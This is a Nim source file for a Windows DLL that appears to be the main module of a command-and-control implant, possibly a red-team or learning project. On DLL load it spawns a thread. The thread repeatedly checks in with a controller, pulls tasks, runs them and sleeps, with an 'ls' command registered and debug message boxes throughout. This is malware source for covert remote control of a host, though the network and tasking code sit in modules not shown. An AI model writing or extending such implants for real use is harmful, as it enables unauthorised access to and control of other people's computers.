# Main Code for the Windows DLL
import winim
import config
import mainAgent
import std/tables
import strformat

import commands/ls

proc NimMain() {.cdecl, importc.}

var threadHndl: HANDLE

proc run() {.stdcall, exportc, dynlib.} =

  MessageBox(0, "Run() is called", "Nim is Powerful", 0)
  agent.commands = {
        5863588'u64: cast[pointer](cmd_ls),  # Command: ls
  }.toTable

  while true:
    if not agent.isCheckedIn:
      MessageBox(0, "It seems isCheckedIn fails somehow", "Nim is Powerful", 0)
      if checkIn():
        MessageBox(0, "Officially checked in", "Nim is Powerful", 0)
        agent.isCheckedIn = true
      sleepAgent()
    else:
      getTasking()
      processTasks()
      sleepAgent()

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =


  NimMain()
  if fdwReason == DLL_PROCESS_ATTACH:

    MessageBox(0, "DllMain Attach, starting thread", "Nim is Powerful", 0)
    var threadId: PDWORD
    threadHndl = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](run), cast[LPVOID](0), 0, threadId)

  elif fdwReason == DLL_PROCESS_DETACH:
    MessageBox(0, fmt"DllMain Detach [{threadHndl}]", "Nim is Powerful", 0)
    WaitForSingleobject(threadHndl, INFINITE)
    MessageBox(0, "Should not be reached", "Nim is Powerful", 0)

  return true


